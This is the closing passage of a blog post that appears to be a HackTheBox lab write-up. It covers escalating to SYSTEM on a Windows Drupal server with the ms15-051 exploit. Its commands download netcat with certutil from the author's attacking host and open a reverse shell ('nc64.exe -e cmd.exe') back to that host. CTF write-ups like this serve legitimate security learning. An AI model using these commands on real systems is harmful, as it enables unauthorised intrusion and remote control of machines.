<span class="n">Mode</span><span class="w">                </span><span class="n">LastWriteTime</span><span class="w">     </span><span class="n">Length</span><span class="w"> </span><span class="n">Name</span><span class="w">                               </span>
<span class="c1">----                -------------     ------ ----                               </span>
<span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="w">         </span><span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="w"></span>

<span class="o">-</span><span class="n">a</span><span class="c1">---          9/4/2020  10:10 ??     330189 ms15-051.exe                 </span>

<span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="w">         </span><span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="n">p</span><span class="w">   </span>
</pre></div>


<div class="highlight"><pre><span></span><span class="err">PS C:\inetpub\drupal-7.54&gt; ./ms15-051.exe whoami</span>
<span class="err">[#] ms15-051 fixed by zcgonvh</span>
<span class="err">[!] process with pid: 2992 created.</span>
<span class="err">==============================</span>
<span class="err">nt authority\system</span>
</pre></div>


<p>Now, for some reasons I was unable to navigate to the administrator directory and grab the root flag using the <code>ms15-051.exe</code> from the cli. When I did try to read the file nothing was found. After few tries I then decided to get a full administrative shell. So downloaded a x64 version of netcat into the windows box:</p>
<div class="highlight"><pre><span></span><span class="err">PS C:\inetpub\drupal-7.54&gt; c:\windows\system32\certutil.exe -urlcache -split -f http://10.10.14.61:8000/nc64.exe nc64.exe        </span>
<span class="err">****  Online  ****</span>
<span class="err">0000  ...</span>
<span class="err">b0d8</span>
<span class="c">CertUtil: -URLCache command completed successfully.</span>
</pre></div>


<p>Then, after having started a netcat listener on my attacking box, I run the following command to get a shell as admin:</p>
<div class="highlight"><pre><span></span><span class="c">C:\inetpub\drupal-7.54&gt; ./ms15-051.exe &quot;nc64.exe -e cmd.exe 10.10.14.61 9999&quot;</span>
</pre></div>


<p>so I get the shell back:</p>
<div class="highlight"><pre><span></span><span class="err">┌─</span><span class="o">[</span><span class="n">doluar@parrot</span><span class="o">]</span><span class="err">─</span><span class="o">[</span><span class="n">~</span><span class="o">]</span><span class="w">                                     </span>
<span class="err">└──╼</span><span class="w"> </span><span class="err">$</span><span class="n">sudo</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lnvp</span><span class="w"> </span><span class="mi">9999</span><span class="w">                                   </span>
<span class="o">[</span><span class="n">sudo</span><span class="o">]</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nl">doluar</span><span class="p">:</span><span class="w">                               </span>
<span class="n">listening</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="o">[</span><span class="n">any</span><span class="o">]</span><span class="w"> </span><span class="mi">9999</span><span class="w"> </span><span class="p">...</span><span class="w">                               </span>

<span class="k">connect</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="o">[</span><span class="n">10.10.14.61</span><span class="o">]</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">UNKNOWN</span><span class="p">)</span><span class="w"> </span><span class="o">[</span><span class="n">10.10.10.9</span><span class="o">]</span><span class="w"> </span><span class="mi">49179</span><span class="w"> </span>
<span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="o">[</span><span class="n">Version 6.1.7600</span><span class="o">]</span><span class="w"></span>
<span class="n">Copyright</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="w"> </span><span class="mi">2009</span><span class="w"> </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Corporation</span><span class="p">.</span><span class="w">  </span><span class="ow">All</span><span class="w"> </span><span class="n">rights</span><span class="w"> </span><span class="n">reserved</span><span class="p">.</span><span class="w"></span>

<span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">inetpub</span><span class="err">\</span><span class="n">drupal</span><span class="o">-</span><span class="mf">7.54</span><span class="o">&gt;</span><span class="nl">c</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">system32</span><span class="err">\</span><span class="n">whoami</span><span class="w"></span>
<span class="nl">c</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">system32</span><span class="err">\</span><span class="n">whoami</span><span class="w">                                </span>
<span class="n">nt</span><span class="w"> </span><span class="n">authority</span><span class="err">\</span><span class="k">system</span><span class="w"> </span>
</pre></div>


<p>and now I am able to read the root flag:</p>
<div class="highlight"><pre><span></span><span class="k">C</span><span class="p">:</span><span class="o">#</span><span class="n">Users</span><span class="o">#</span><span class="n">Administrator</span><span class="o">#</span><span class="n">Desktop</span><span class="o">&gt;</span><span class="k">type</span> <span class="n">root</span><span class="p">.</span><span class="n">txt</span><span class="p">.</span><span class="n">txt</span>

<span class="k">type</span> <span class="n">root</span><span class="p">.</span><span class="n">txt</span><span class="p">.</span><span class="n">txt</span>

<span class="mi">4</span><span class="n">b</span><span class="o">****************************</span><span class="mi">7</span><span class="k">c</span>
</pre></div>
      </div><!-- .entry-content -->
      <br /><br />
      <div class="article_meta">
        Tags:
          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
    </div>
  </div>
</article><!-- #post-## -->
                </div>
              </div><!-- #main -->
          </div><!-- #primary -->
        </div>
      </div><!-- close .row -->
    </div><!-- close .container -->
  </div><!-- close .site-content -->




  <div id="footer-area">
    <footer id="colophon" class="site-footer" role="contentinfo">
      <div class="site-info container">
        <div class="row">
                    <div class="copyright col-md-12">
                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
        </div>
      </div><!-- .site-info -->
      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
    </footer><!-- #colophon -->
  </div>

  <script type="text/javascript">
    window.addEventListener('load', function(){
    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
      window.scroll(0, document.getElementById('main').offsetTop);
    }})
  </script>




</body>
</html>